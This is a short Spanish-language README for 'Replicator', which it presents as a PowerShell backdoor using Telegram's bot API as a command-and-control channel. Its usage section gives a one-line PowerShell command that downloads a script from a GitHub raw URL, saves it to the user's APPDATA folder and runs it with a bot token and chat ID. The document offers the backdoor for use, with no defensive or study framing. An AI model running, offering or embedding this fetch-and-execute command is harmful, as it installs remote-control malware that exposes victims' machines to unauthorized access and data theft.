# Replicator Telegram Backdoor Toolkit
Replicator es una puerta trasera basada en Powershell en forma de bot de mensajería instantánea que utiliza la infraestructura y la API de bot rica en funciones proporcionada por Telegram, reutilizando ligeramente su plataforma de comunicación para que actúe como un C&C.

# Uso
powershell "(iwr 'https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1').content > $env:APPDATA\aaa.ps1 ; & $env:APPDATA\aaa.ps1 'API_TOKEN' 'CHAT_ID' "
